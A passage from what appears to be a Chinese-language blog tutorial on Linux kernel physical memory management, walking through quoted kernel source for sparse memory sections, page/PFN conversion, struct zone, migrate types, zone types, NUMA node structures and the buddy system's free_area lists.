mem_section[NR_SECTION_ROOTS][SECTIONS_PER_ROOT]\t____cacheline_internodealigned_in_smp;#endif\n\n若未开启CONFIG_SPARSEMEM_EXTREME编译选项则 mem_section 为一个常规的二维数组，否则为一个二级指针，其所指向空间内存动态分配。\n\n这种模型支持内存的热拔插。\n这里需要注意到的是，在struct mem_section结构体中的section_mem_map成员的定义并非是struct page*而是unsigned long类型的，其记录的其实是 page 数组与PFN之间的差值section_mem_map = page_arr_addr - PFN_start。\n#elif defined(CONFIG_SPARSEMEM)/* * Note: section&#x27;s mem_map is encoded to reflect its start_pfn. * section[i].section_mem_map == mem_map&#x27;s address - start_pfn; */#define __page_to_pfn(pg)\t\t\t\t\t\\(&#123;\tconst struct page *__pg = (pg);\t\t\t\t\\\tint __sec = page_to_section(__pg);\t\t\t\\\t(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));\t\\&#125;)#define __pfn_to_page(pfn)\t\t\t\t\\(&#123;\tunsigned long __pfn = (pfn);\t\t\t\\\tstruct mem_section *__sec = __pfn_to_section(__pfn);\t\\\t__section_mem_map_addr(__sec) + __pfn;\t\t\\&#125;)#endif /* CONFIG_FLATMEM/SPARSEMEM */\n\n在内核中也提供了 PFN 和 page 之间转化的两个宏定义，这里详细分析一下。\n#define __page_to_pfn(pg)\t\t\t\t\t\\(&#123;\tconst struct page *__pg = (pg);\t\t\t\t\\\tint __sec = page_to_section(__pg);\t\t\t\\\t(unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));\t\\&#125;)\n\n首先看page到PFN的过程\nstatic inline unsigned long page_to_section(const struct page *page)&#123;\treturn (page-&gt;flags &gt;&gt; SECTIONS_PGSHIFT) &amp; SECTIONS_MASK;&#125;\n\n首先会使用page_to_setion函数，其函数内部实现是通过page-&gt;flags获取到page所属的section标号。\nstatic inline struct mem_section *__nr_to_section(unsigned long nr)&#123;\tunsigned long root = SECTION_NR_TO_ROOT(nr);\tif (unlikely(root &gt;= NR_SECTION_ROOTS))\t\treturn NULL;#ifdef CONFIG_SPARSEMEM_EXTREME\tif (!mem_section || !mem_section[root])\t\treturn NULL;#endif\treturn &amp;mem_section[root][nr &amp; SECTION_ROOT_MASK];&#125;\n\n随后通过调用__nr_to_section函数获得对应mem_section结构体的地址\n#ifdef CONFIG_SPARSEMEM_EXTREME#define SECTIONS_PER_ROOT       (PAGE_SIZE / sizeof (struct mem_section))#else#define SECTIONS_PER_ROOT\t1#endif#define SECTION_NR_TO_ROOT(sec)\t((sec) / SECTIONS_PER_ROOT)\n\n这里默认开启CONFIG_SPARSEMEM_EXTREME，此时SECTIONS_PER_ROOT含义为一页中struct mem_section的数量，所以SECTION_NR_TO_ROOT宏得到的是对应的页下表，最后通过nr &amp; SECTION_ROOT_MASK获得在该页下的mem_section数组下标。\nstatic inline struct page *__section_mem_map_addr(struct mem_section *section)&#123;\tunsigned long map = section-&gt;section_mem_map;\tmap &amp;= SECTION_MAP_MASK;\treturn (struct page *)map;&#125;\n\n之后通过__section_mem_map_addr获取mem_section结构体中section_mem_map成员，最后与page结构体的地址做差运算便能获得其PFN，根据前面的条件可以得到最终的运算写法其实是(page_addr - page_arr_addr) + PFN_start = PFN。\n接下看一下__pfn_to_page了\n#define __pfn_to_page(pfn)\t\t\t\t\\(&#123;\tunsigned long __pfn = (pfn);\t\t\t\\\tstruct mem_section *__sec = __pfn_to_section(__pfn);\t\\\t__section_mem_map_addr(__sec) + __pfn;\t\t\\&#125;)\n\n#define PFN_SECTION_SHIFT\t(SECTION_SIZE_BITS - PAGE_SHIFT)static inline unsigned long pfn_to_section_nr(unsigned long pfn)&#123;\treturn pfn &gt;&gt; PFN_SECTION_SHIFT;&#125;static inline struct mem_section *__pfn_to_section(unsigned long pfn)&#123;\treturn __nr_to_section(pfn_to_section_nr(pfn));&#125;\n\n这里首先调用__pfn_to_section函数来获得PFN对应的mem_section。首先通过调用pfn_to_section_nr函数获取对应section的索引。可以看到函数中使用到了PFN_SECTION_SHIFT，而其定义为SECTION_SIZE_BITS减去PAGE_SHIFT，其中SECTION_SIZE_BITS的含义为一个section所占的位数，后面则是很熟悉的一个页的位数，所以PFN_SECTION_SHIFT含义为一个section中页的数量。\n而pfn_to_section_nr函数内部实现为使用页框号向右移位一个section中页的数量最终得到的是当前页在section中的标号。\n随后调用__nr_to_section函数获取对应mem_section地址，最后使用__section_mem_map_addr函数获取到section_mem_map成员再与页框号做加法，根据前面的条件这里最终运算的写法可以写作(PFN - PFN_start) + page_arr_addr = page_addr 。\n最后，基于Sparse Memory 内存模型上引入了 vmemmap 的概念，是目前 Linux 最常用的内存模型之一。\n\n在开启了vmemmap之后，所有的mem_section中的 page 都抽象到一个虚拟数组vmemmap中，这样在进行struct page *和 pfn 转换时，直接使用vmemmap数组即可。\n#elif defined(CONFIG_SPARSEMEM_VMEMMAP)/* memmap is virtually contiguous.  */#define __pfn_to_page(pfn)\t(vmemmap + (pfn))#define __page_to_pfn(page)\t(unsigned long)((page) - vmemmap)\n\nstruct zone在 Linux 下将一个节点内不同用途的内存区域划分为不同的区即zone，对应结构体 struct zone。\nstruct zone &#123;\t/* Read-mostly fields */\t/* zone watermarks, access with *_wmark_pages(zone) macros */\tunsigned long _watermark[NR_WMARK];\tunsigned long watermark_boost;\tunsigned long nr_reserved_highatomic;\t/*\t * We don&#x27;t know if the memory that we&#x27;re going to allocate will be\t * freeable or/and it will be released eventually, so to avoid totally\t * wasting several GB of ram we must reserve some of the lower zone\t * memory (otherwise we risk to run OOM on the lower zones despite\t * there being tons of freeable ram on the higher zones).  This array is\t * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl\t * changes.\t */\tlong lowmem_reserve[MAX_NR_ZONES];#ifdef CONFIG_NUMA\tint node;#endif\tstruct pglist_data\t*zone_pgdat;\tstruct per_cpu_pages\t__percpu *per_cpu_pageset;\tstruct per_cpu_zonestat\t__percpu *per_cpu_zonestats;\t/*\t * the high and batch values are copied to individual pagesets for\t * faster access\t */\tint pageset_high;\tint pageset_batch;#ifndef CONFIG_SPARSEMEM\t/*\t * Flags for a pageblock_nr_pages block. See pageblock-flags.h.\t * In SPARSEMEM, this map is stored in struct mem_section\t */\tunsigned long\t\t*pageblock_flags;#endif /* CONFIG_SPARSEMEM */\t/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */\tunsigned long\t\tzone_start_pfn;\t/*\t * spanned_pages is the total pages spanned by the zone, including\t * holes, which is calculated as:\t * \tspanned_pages = zone_end_pfn - zone_start_pfn;\t *\t * present_pages is physical pages existing within the zone, which\t * is calculated as:\t *\tpresent_pages = spanned_pages - absent_pages(pages in holes);\t *\t * present_early_pages is present pages existing within the zone\t * located on memory available since early boot, excluding hotplugged\t * memory.\t *\t * managed_pages is present pages managed by the buddy system, which\t * is calculated as (reserved_pages includes pages allocated by the\t * bootmem allocator):\t *\tmanaged_pages = present_pages - reserved_pages;\t *\t * cma pages is present pages that are assigned for CMA use\t * (MIGRATE_CMA).\t *\t * So present_pages may be used by memory hotplug or memory power\t * management logic to figure out unmanaged pages by checking\t * (present_pages - managed_pages). And managed_pages should be used\t * by page allocator and vm scanner to calculate all kinds of watermarks\t * and thresholds.\t *\t * Locking rules:\t *\t * zone_start_pfn and spanned_pages are protected by span_seqlock.\t * It is a seqlock because it has to be read outside of zone-&gt;lock,\t * and it is done in the main allocator path.  But, it is written\t * quite infrequently.\t *\t * The span_seq lock is declared along with zone-&gt;lock because it is\t * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to\t * give them a chance of being in the same cacheline.\t *\t * Write access to present_pages at runtime should be protected by\t * mem_hotplug_begin/done(). Any reader who can&#x27;t tolerant drift of\t * present_pages should use get_online_mems() to get a stable value.\t */\tatomic_long_t\t\tmanaged_pages;\tunsigned long\t\tspanned_pages;\tunsigned long\t\tpresent_pages;#if defined(CONFIG_MEMORY_HOTPLUG)\tunsigned long\t\tpresent_early_pages;#endif#ifdef CONFIG_CMA\tunsigned long\t\tcma_pages;#endif\tconst char\t\t*name;#ifdef CONFIG_MEMORY_ISOLATION\t/*\t * Number of isolated pageblock. It is used to solve incorrect\t * freepage counting problem due to racy retrieving migratetype\t * of pageblock. Protected by zone-&gt;lock.\t */\tunsigned long\t\tnr_isolate_pageblock;#endif#ifdef CONFIG_MEMORY_HOTPLUG\t/* see spanned/present_pages for more description */\tseqlock_t\t\tspan_seqlock;#endif\tint initialized;\t/* Write-intensive fields used from the page allocator */\tCACHELINE_PADDING(_pad1_);\t/* free areas of different sizes */\tstruct free_area\tfree_area[MAX_ORDER + 1];#ifdef CONFIG_UNACCEPTED_MEMORY\t/* Pages to be accepted. All pages on the list are MAX_ORDER */\tstruct list_head\tunaccepted_pages;#endif\t/* zone flags, see below */\tunsigned long\t\tflags;\t/* Primarily protects free_area */\tspinlock_t\t\tlock;\t/* Write-intensive fields used by compaction and vmstats. */\tCACHELINE_PADDING(_pad2_);\t/*\t * When free pages are below this point, additional steps are taken\t * when reading the number of free pages to avoid per-cpu counter\t * drift allowing watermarks to be breached\t */\tunsigned long percpu_drift_mark;#if defined CONFIG_COMPACTION || defined CONFIG_CMA\t/* pfn where compaction free scanner should start */\tunsigned long\t\tcompact_cached_free_pfn;\t/* pfn where compaction migration scanner should start */\tunsigned long\t\tcompact_cached_migrate_pfn[ASYNC_AND_SYNC];\tunsigned long\t\tcompact_init_migrate_pfn;\tunsigned long\t\tcompact_init_free_pfn;#endif#ifdef CONFIG_COMPACTION\t/*\t * On compaction failure, 1&lt;&lt;compact_defer_shift compactions\t * are skipped before trying again. The number attempted since\t * last failure is tracked with compact_considered.\t * compact_order_failed is the minimum compaction failed order.\t */\tunsigned int\t\tcompact_considered;\tunsigned int\t\tcompact_defer_shift;\tint\t\t\tcompact_order_failed;#endif#if defined CONFIG_COMPACTION || defined CONFIG_CMA\t/* Set to true when the PG_migrate_skip bits should be cleared */\tbool\t\t\tcompact_blockskip_flush;#endif\tbool\t\t\tcontiguous;\tCACHELINE_PADDING(_pad3_);\t/* Zone statistics */\tatomic_long_t\t\tvm_stat[NR_VM_ZONE_STAT_ITEMS];\tatomic_long_t\t\tvm_numa_event[NR_VM_NUMA_EVENT_ITEMS];&#125; ____cacheline_internodealigned_in_smp;\n\n_watermark：水位线每一个 zone 都有着其对应的三档“水位线”： WMARK_MIN、WMARK_LOW、WMARK_HIGH，存放在 _watermark 数组中，在进行内存分配时，分配器（例如 buddy system）会根据当前 zone 中空余内存所处在的“水位线”来判断当前的内存状况。在进行内存分配的时候，如果分配器（比如buddy allocator）发现当前空余内存的值低于”low”但高于”min”，说明现在内存面临一定的压力，那么在此次内存分配完成后，kswapd将被唤醒，以执行内存回收操作。在这种情况下，内存分配虽然会触发内存回收，但不存在被内存回收所阻塞的问题，两者的执行关系是异步的（之前的kswapd实现是周期性触发）。”low”可以被认为是一个警戒水位线，而”high”则是一个安全的水位线。\n\nlowmem_reserve：zone自身的保留内存在进行内存分配时，若当前的 zone 没有足够的内存了，则会向下一个 zone 索要内存，那么这就存在一个问题：来自 higher zones 的内存分配请求可能耗尽 lower zones 的内存，但这样分配的内存未必是可释放的（freeable），亦或者/且最终不一定会被释放，这有可能导致 lower zones 的内存提前耗尽，而 higher zones 却仍保留有大量的内存\n为了避免这样的一种情况的发生，lowmem_reserve 字段用以声明为该 zone 保留的内存，这一块内存别的 zone 是不能动的\nnode：NUMA中标识所属node只有在CONFIG_NUMA即开启NUMA时该字段才会被启用，用来标识该zone所属的node。\n\nzone_pgdat：zone 所属的 pglist_data 节点该字段用以标识该 zone 所属的 pglist_data 节点\nper_cpu_pageset：zone 为每个 CPU 划分一个独立的”页面仓库“众所周知伴随着多 CPU 的引入，条件竞争就是一个不可忽视的问题，当多个 CPU 需要对一个 zone 进行操作时，频繁的加锁/解锁操作则毫无疑问会造成大量的开销，因此 zone 引入了 per_cpu_pageset 结构体成员，即为每一个 CPU 都准备一个单独的页面仓库，因此其实现方式是实现为一个 percpu 变量。在一开始时buddy system会将页面放置到各个 CPU 自己独立的页面仓库中，需要进行分配时 CPU 优先从自己的页面仓库中分配。\nstruct per_cpu_pages &#123;\tspinlock_t lock;\t/* Protects lists field */\tint count;\t\t/* number of pages in the list */\tint high;\t\t/* high watermark, emptying needed */\tint batch;\t\t/* chunk size for buddy add/remove */\tshort free_factor;\t/* batch scaling factor during free */#ifdef CONFIG_NUMA\tshort expire;\t\t/* When 0, remote pagesets are drained */#endif\t/* Lists of pages, one per migrate type stored on the pcp-lists */\tstruct list_head lists[NR_PCP_LISTS];&#125; ____cacheline_aligned_in_smp;\n\n该结构体会被存放在每个 CPU 自己独立的 .data..percpu 段中。\nvm_stat：统计数据该数组用来进行数据统计，按照枚举类型 zone_stat_item 分为多个数组，以统计不同类型的数据（比如说 NR_FREE_PAGES 表示 zone 中的空闲页面1数量）：\nenum zone_stat_item &#123;\t/* First 128 byte cacheline (assuming 64 bit words) */\tNR_FREE_PAGES,\tNR_ZONE_LRU_BASE, /* Used only for compaction and reclaim retry */\tNR_ZONE_INACTIVE_ANON = NR_ZONE_LRU_BASE,\tNR_ZONE_ACTIVE_ANON,\tNR_ZONE_INACTIVE_FILE,\tNR_ZONE_ACTIVE_FILE,\tNR_ZONE_UNEVICTABLE,\tNR_ZONE_WRITE_PENDING,\t/* Count of dirty, writeback and unstable pages */\tNR_MLOCK,\t\t/* mlock()ed pages found and moved off LRU */\t/* Second 128 byte cacheline */\tNR_BOUNCE,#if IS_ENABLED(CONFIG_ZSMALLOC)\tNR_ZSPAGES,\t\t/* allocated in zsmalloc */#endif\tNR_FREE_CMA_PAGES,#ifdef CONFIG_UNACCEPTED_MEMORY\tNR_UNACCEPTED,#endif\tNR_VM_ZONE_STAT_ITEMS &#125;;\n\nfree_area：buddy system 按照 order 管理的页面该字段用以存储buddy system按照 order 管理的页面，为一个 free_area 结构体数组，该结构体定义如下：\nstruct free_area &#123;\tstruct list_head\tfree_list[MIGRATE_TYPES];\tunsigned long\t\tnr_free;&#125;;\n\n在 free_area 中存放的页面通过自身的相应字段连接成双向链表结构\n\nfree_area 中并非只有一个双向链表，而是按照不同的“迁移类型”（migrate type）进行分开存放，这是由于页面迁移机制的存在。\n\n后续成员zone_start_pfn：zone 的起始物理PFN\n该字段用以标识该 zone 的起始物理页帧号。\nspanned_pages：zone 对应的内存区域中的 pages 总数（包括空洞）\n该字段用以标识该 zone 对应的内存区域中的 pages 总数, 包括空洞\npresent_pages： zone 中存在的物理页框数\n该字段用以标识 zone 中实际存在的物理页框数\nmanaged_pages：zone 中 buddy system 管理的页面数量\n该字段用以标识 zone 中 buddy system 管理的页面数量\nflags：标志位\n该 zone 的标志位，用以标识其所处的状态\n页面迁移机制页面迁移主要用以解决内核空间中的碎片问题，在长期的运行之后内存当中空闲页面的分布可能是零散的，这便导致了内核有可能无法映射到足够大的连续内存，因此需要进行页面迁移即将旧的页面迁移到新的位置，相信大家在操作系统课都学习过的。\n但并非所有的页面都是能够随意迁移的，因此我们在 buddy system 当中还需要将页面按照迁移类型进行分类。\nenum migratetype &#123;\tMIGRATE_UNMOVABLE,\tMIGRATE_MOVABLE,\tMIGRATE_RECLAIMABLE,\tMIGRATE_PCPTYPES,\t/* the number of types on the pcp lists */\tMIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,#ifdef CONFIG_CMA\t/*\t * MIGRATE_CMA migration type is designed to mimic the way\t * ZONE_MOVABLE works.  Only movable pages can be allocated\t * from MIGRATE_CMA pageblocks and page allocator never\t * implicitly change migration type of MIGRATE_CMA pageblock.\t *\t * The way to use it is to change migratetype of a range of\t * pageblocks to MIGRATE_CMA which can be done by\t * __free_pageblock_cma() function.\t */\tMIGRATE_CMA,#endif#ifdef CONFIG_MEMORY_ISOLATION\tMIGRATE_ISOLATE,\t/* can&#x27;t allocate from here */#endif\tMIGRATE_TYPES&#125;;\n\n迁移类型由上面的枚举类型定义。\n\n  MIGRATE_UNMOVABLE：这类型页面在内存当中有着固定的位置，不能移动\n  MIGRATE_MOVABLE：这类页面可以随意移动，例如用户空间的页面，我们只需要复制数据后改变页表映射即可\n  MIGRATE_RECLAIMABLE：这类页面不能直接移动，但是可以删除，例如映射自文件的页\n  MIGRATE_PCPTYPES：per_cpu_pageset，即每 CPU 页帧缓存，其迁移仅限于同一节点内\n  MIGRATE_ISOLATE：不能从该链表分配页面，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点\n  MIGRATE_TYPES：表示迁移类型的数目，并不存在这一链表\n\nzone分类在 Linux kernel 当中，我们根据内存区段的不同用途，将其划分为不同的 zone\nenum zone_type &#123;\t/*\t * ZONE_DMA and ZONE_DMA32 are used when there are peripherals not able\t * to DMA to all of the addressable memory (ZONE_NORMAL).\t * On architectures where this area covers the whole 32 bit address\t * space ZONE_DMA32 is used. ZONE_DMA is left for the ones with smaller\t * DMA addressing constraints. This distinction is important as a 32bit\t * DMA mask is assumed when ZONE_DMA32 is defined. Some 64-bit\t * platforms may need both zones as they support peripherals with\t * different DMA addressing limitations.\t */#ifdef CONFIG_ZONE_DMA\tZONE_DMA,#endif#ifdef CONFIG_ZONE_DMA32\tZONE_DMA32,#endif\t/*\t * Normal addressable memory is in ZONE_NORMAL. DMA operations can be\t * performed on pages in ZONE_NORMAL if the DMA devices support\t * transfers to all addressable memory.\t */\tZONE_NORMAL,#ifdef CONFIG_HIGHMEM\t/*\t * A memory area that is only addressable by the kernel through\t * mapping portions into its own address space. This is for example\t * used by i386 to allow the kernel to address the memory beyond\t * 900MB. The kernel will set up special mappings (page\t * table entries on i386) for each page that the kernel needs to\t * access.\t */\tZONE_HIGHMEM,#endif\t/*\t * ZONE_MOVABLE is similar to ZONE_NORMAL, except that it contains\t * movable pages with few exceptional cases described below. Main use\t * cases for ZONE_MOVABLE are to make memory offlining/unplug more\t * likely to succeed, and to locally limit unmovable allocations - e.g.,\t * to increase the number of THP/huge pages. Notable special cases are:\t *\t * 1. Pinned pages: (long-term) pinning of movable pages might\t *    essentially turn such pages unmovable. Therefore, we do not allow\t *    pinning long-term pages in ZONE_MOVABLE. When pages are pinned and\t *    faulted, they come from the right zone right away. However, it is\t *    still possible that address space already has pages in\t *    ZONE_MOVABLE at the time when pages are pinned (i.e. user has\t *    touches that memory before pinning). In such case we migrate them\t *    to a different zone. When migration fails - pinning fails.\t * 2. memblock allocations: kernelcore/movablecore setups might create\t *    situations where ZONE_MOVABLE contains unmovable allocations\t *    after boot. Memory offlining and allocations fail early.\t * 3. Memory holes: kernelcore/movablecore setups might create very rare\t *    situations where ZONE_MOVABLE contains memory holes after boot,\t *    for example, if we have sections that are only partially\t *    populated. Memory offlining and allocations fail early.\t * 4. PG_hwpoison pages: while poisoned pages can be skipped during\t *    memory offlining, such pages cannot be allocated.\t * 5. Unmovable PG_offline pages: in paravirtualized environments,\t *    hotplugged memory blocks might only partially be managed by the\t *    buddy (e.g., via XEN-balloon, Hyper-V balloon, virtio-mem). The\t *    parts not manged by the buddy are unmovable PG_offline pages. In\t *    some cases (virtio-mem), such pages can be skipped during\t *    memory offlining, however, cannot be moved/allocated. These\t *    techniques might use alloc_contig_range() to hide previously\t *    exposed pages from the buddy again (e.g., to implement some sort\t *    of memory unplug in virtio-mem).\t * 6. ZERO_PAGE(0), kernelcore/movablecore setups might create\t *    situations where ZERO_PAGE(0) which is allocated differently\t *    on different platforms may end up in a movable zone. ZERO_PAGE(0)\t *    cannot be migrated.\t * 7. Memory-hotplug: when using memmap_on_memory and onlining the\t *    memory to the MOVABLE zone, the vmemmap pages are also placed in\t *    such zone. Such pages cannot be really moved around as they are\t *    self-stored in the range, but they are treated as movable when\t *    the range they describe is about to be offlined.\t *\t * In general, no unmovable allocations that degrade memory offlining\t * should end up in ZONE_MOVABLE. Allocators (like alloc_contig_range())\t * have to expect that migrating pages in ZONE_MOVABLE can fail (even\t * if has_unmovable_pages() states that there are no unmovable pages,\t * there can be false negatives).\t */\tZONE_MOVABLE,#ifdef CONFIG_ZONE_DEVICE\tZONE_DEVICE,#endif\t__MAX_NR_ZONES&#125;;\n\n\n  ZONE_DMA：直接内存访问区域，使用 DMA 内存情况 :有些设备架构比较老 , 无法直接访问整个内存 , 需要使用 DMA 直接内存访问区域 ;\n  ZONE_DMA32：对应的是64位系统 , DMA32区域。可以支持两种设备的访问，只能直接访问 16 MB 以下的内存设备；只能直接访问 4 GB 以下的内存设备。\n   ZONE_NORMAL：普通内存区域，该内存区域 可以 直接映射到 “ 内核虚拟地址空间 “。\n   ZONE_HIGHMEM：高端内存区域，这是32位架构中的概念，DMA 和 DMA32 又称为”低端内存区域”。\n   ZONE_MOVABLE：”可移动区域” , 这是为了防止”内存碎片”的伪内存区。\n   ZONE_DEVICE：”设备区域”, 这是为了支持”内存热插拔”而设置的内存区域 , 每个设备区域使用 zone 结构体表示。\n\n大致总结一下，下面先看X86-32\n\n\n\nType\nStart address\nEnd address\n\n\n\nZONE_DMA\n0MB\n16MB\n\n\nZONE_NORMAL\n16MB\n896MB\n\n\nZONE_HIGHMEM\n896MB\n…\n\n\nX86-64\n\n\n\nType\nStart address\nEnd address\n\n\n\nZONE_DMA\n0MB\n16MB\n\n\nZONE_DMA32\n16MB\n4GB\n\n\nZONE_NORMAL\n4GB\n…\n\n\nstruct pglist_datazone上一层则是节点，Linux将内存控制器作为节点划分的依据，对于 UMA 架构而言只有一个节点，而对于 NUMA 架构而言通常有多个节点，对于同一个内存控制器下的 CPU 而言其对应的节点称之为本地内存，不同处理器之间通过总线进行进一步的连接。\n\n一个节点使用pglist_data结构进行描述\ntypedef struct pglist_data &#123;\t/*\t * node_zones contains just the zones for THIS node. Not all of the\t * zones may be populated, but it is the full list. It is referenced by\t * this node&#x27;s node_zonelists as well as other node&#x27;s node_zonelists.\t */\tstruct zone node_zones[MAX_NR_ZONES];\t/*\t * node_zonelists contains references to all zones in all nodes.\t * Generally the first zones will be references to this node&#x27;s\t * node_zones.\t */\tstruct zonelist node_zonelists[MAX_ZONELISTS];\tint nr_zones; /* number of populated zones in this node */#ifdef CONFIG_FLATMEM\t/* means !SPARSEMEM */\tstruct page *node_mem_map;#ifdef CONFIG_PAGE_EXTENSION\tstruct page_ext *node_page_ext;#endif#endif#if defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)\t/*\t * Must be held any time you expect node_start_pfn,\t * node_present_pages, node_spanned_pages or nr_zones to stay constant.\t * Also synchronizes pgdat-&gt;first_deferred_pfn during deferred page\t * init.\t *\t * pgdat_resize_lock() and pgdat_resize_unlock() are provided to\t * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG\t * or CONFIG_DEFERRED_STRUCT_PAGE_INIT.\t *\t * Nests above zone-&gt;lock and zone-&gt;span_seqlock\t */\tspinlock_t node_size_lock;#endif\tunsigned long node_start_pfn;\tunsigned long node_present_pages; /* total number of physical pages */\tunsigned long node_spanned_pages; /* total size of physical page\t\t\t\t\t     range, including holes */\tint node_id;\twait_queue_head_t kswapd_wait;\twait_queue_head_t pfmemalloc_wait;\t/* workqueues for throttling reclaim for different reasons. */\twait_queue_head_t reclaim_wait[NR_VMSCAN_THROTTLE];\tatomic_t nr_writeback_throttled;/* nr of writeback-throttled tasks */\tunsigned long nr_reclaim_start;\t/* nr pages written while throttled\t\t\t\t\t * when throttling started. */#ifdef CONFIG_MEMORY_HOTPLUG\tstruct mutex kswapd_lock;#endif\tstruct task_struct *kswapd;\t/* Protected by kswapd_lock */\tint kswapd_order;\tenum zone_type kswapd_highest_zoneidx;\tint kswapd_failures;\t\t/* Number of &#x27;reclaimed == 0&#x27; runs */#ifdef CONFIG_COMPACTION\tint kcompactd_max_order;\tenum zone_type kcompactd_highest_zoneidx;\twait_queue_head_t kcompactd_wait;\tstruct task_struct *kcompactd;\tbool proactive_compact_trigger;#endif\t/*\t * This is a per-node reserve of pages that are not available\t * to userspace allocations.\t */\tunsigned long\t\ttotalreserve_pages;#ifdef CONFIG_NUMA\t/*\t * node reclaim becomes active if more unmapped pages exist.\t */\tunsigned long\t\tmin_unmapped_pages;\tunsigned long\t\tmin_slab_pages;#endif /* CONFIG_NUMA */\t/* Write-intensive fields used by page reclaim */\tCACHELINE_PADDING(_pad1_);#ifdef CONFIG_DEFERRED_STRUCT_PAGE_INIT\t/*\t * If memory initialisation on large machines is deferred then this\t * is the first PFN that needs to be initialised.\t */\tunsigned long first_deferred_pfn;#endif /* CONFIG_DEFERRED_STRUCT_PAGE_INIT */#ifdef CONFIG_TRANSPARENT_HUGEPAGE\tstruct deferred_split deferred_split_queue;#endif#ifdef CONFIG_NUMA_BALANCING\t/* start time in ms of current promote rate limit period */\tunsigned int nbp_rl_start;\t/* number of promote candidate pages at start time of current rate limit period */\tunsigned long nbp_rl_nr_cand;\t/* promote threshold in ms */\tunsigned int nbp_threshold;\t/* start time in ms of current promote threshold adjustment period */\tunsigned int nbp_th_start;\t/*\t * number of promote candidate pages at start time of current promote\t * threshold adjustment period\t */\tunsigned long nbp_th_nr_cand;#endif\t/* Fields commonly accessed by the page reclaim scanner */\t/*\t * NOTE: THIS IS UNUSED IF MEMCG IS ENABLED.\t *\t * Use mem_cgroup_lruvec() to look up lruvecs.\t */\tstruct lruvec\t\t__lruvec;\tunsigned long\t\tflags;#ifdef CONFIG_LRU_GEN\t/* kswap mm walk data */\tstruct lru_gen_mm_walk mm_walk;\t/* lru_gen_folio list */\tstruct lru_gen_memcg memcg_lru;#endif\tCACHELINE_PADDING(_pad2_);\t/* Per-node vmstats */\tstruct per_cpu_nodestat __percpu *per_cpu_nodestats;\tatomic_long_t\t\tvm_stat[NR_VM_NODE_STAT_ITEMS];#ifdef CONFIG_NUMA\tstruct memory_tier __rcu *memtier;#endif#ifdef CONFIG_MEMORY_FAILURE\tstruct memory_failure_stats mf_stats;#endif&#125; pg_data_t;\n\n成员描述\n  node_zones: node 的 zone 列表，节点中最重要的字段 node_zones 作为一个 zone 结构体数组 记录了本节点上所有的 zone，其中有效的 zone 的个数由节点结构体的 nr_zones 字段指出。\n  node_zonelists: 内存分配时备用 zone 的搜索顺序，该字段用以确定内存分配时对备用的 zone 的搜索顺序，在本节点常规内存分配失败时会沿着这个数组进行搜索，其中包含的 zone 可以是非本节点的 zone。\n\n其结构体定义如下：\nstruct zoneref &#123;\tstruct zone *zone;\t/* Pointer to actual zone */\tint zone_idx;\t\t/* zone_idx(zoneref-&gt;zone) */&#125;;struct zonelist &#123;\tstruct zoneref _zonerefs[MAX_ZONES_PER_ZONELIST + 1];&#125;;\n\n\n  node_start_pfn: node 的起始页框标号，该字段记录了该节点上的物理内存起始页框标号。\n  node_present_pages: node中物理页的总数量。\n  node_spanned_pages: 该字段记录了节点上包括空洞在内的页帧为单位的该节点内存的总长度。\n  node_id: 该字段记录了该节点在系统中的标号，从 0 开始。\n\nnode存储方式struct pglist_data *node_data[MAX_NUMNODES] __read_mostly;EXPORT_SYMBOL(node_data);\n\n在内核中定一个名为node_data的pglist_data数组，该数组保存着系统中的所有节点。\n\n➜  ~ numactl --hardwareavailable: 1 nodes (0)node 0 cpus: 0 1node 0 size: 3904 MBnode 0 free: 313 MBnode distances:node   0   0:  10 ➜  ~ \n\n在Linux中可以用上述命令查看存在多少node。\nnode状态nodemask_t node_states[NR_NODE_STATES] __read_mostly = &#123;\t[N_POSSIBLE] = NODE_MASK_ALL,\t[N_ONLINE] = &#123; &#123; [0] = 1UL &#125; &#125;,#ifndef CONFIG_NUMA\t[N_NORMAL_MEMORY] = &#123; &#123; [0] = 1UL &#125; &#125;,#ifdef CONFIG_HIGHMEM\t[N_HIGH_MEMORY] = &#123; &#123; [0] = 1UL &#125; &#125;,#endif\t[N_MEMORY] = &#123; &#123; [0] = 1UL &#125; &#125;,\t[N_CPU] = &#123; &#123; [0] = 1UL &#125; &#125;,#endif\t/* NUMA */&#125;;EXPORT_SYMBOL(node_states);\n\n在Linux中存在上面这样一个全局数组用以表示标识对应标号的节点状态。\ntypedef struct &#123; DECLARE_BITMAP(bits, MAX_NUMNODES); &#125; nodemask_t;\n\n这里nodemask_t是一个位图类型。\nenum node_states &#123;\tN_POSSIBLE,\t\t/* The node could become online at some point */\tN_ONLINE,\t\t/* The node is online */\tN_NORMAL_MEMORY,\t/* The node has regular memory */#ifdef CONFIG_HIGHMEM\tN_HIGH_MEMORY,\t\t/* The node has regular or high memory */#else\tN_HIGH_MEMORY = N_NORMAL_MEMORY,#endif\tN_MEMORY,\t\t/* The node has memory(regular, high, movable) */\tN_CPU,\t\t/* The node has one or more cpus */\tN_GENERIC_INITIATOR,\t/* The node has one or more Generic Initiators */\tNR_NODE_STATES&#125;;\n\n这个状态由一个枚举类型 node_states 定义。\nbuddy system中的内存组织形式在上面简单提到了这一zone中的成员，其作用主要用于存储buddy system按照order管理的页面。\nstruct zone &#123;  // ... ...\tstruct free_area\tfree_area[MAX_ORDER + 1];  // ... ...&#125; ____cacheline_internodealigned_in_smp;\n\n这里的MAX_ORDER的值为10所以其数组定义为11。\n在buddy system中按照空闲页面的连续大小进行分阶管理，这里的 order 的实际含义为连续的空闲页面的大小，不过单位不是页面数，而是介，即对于每个下标而言，其中所存储的页面大小为：2^order。\n在free_area中存放的页面通过自身相应字段连接成双向链表结构，在前文中有详细介绍。这里简单说一下free_area结构体。\nstruct free_area &#123;\tstruct list_head\tfree_list[MIGRATE_TYPES];\tunsigned long\t\tnr_free;&#125;;\n\n这里的nr_free成员很明显就是用于记录了在当前free_area中的空闲页面块的数量，对于free_area[0]以外的free_area而言其单位并非是单个页框，而是以内存块为单位。\n而free_list成员则是为list_head的链表结构其通过page结构体的lru字段将page结构体连接成双向链表。\nstruct page 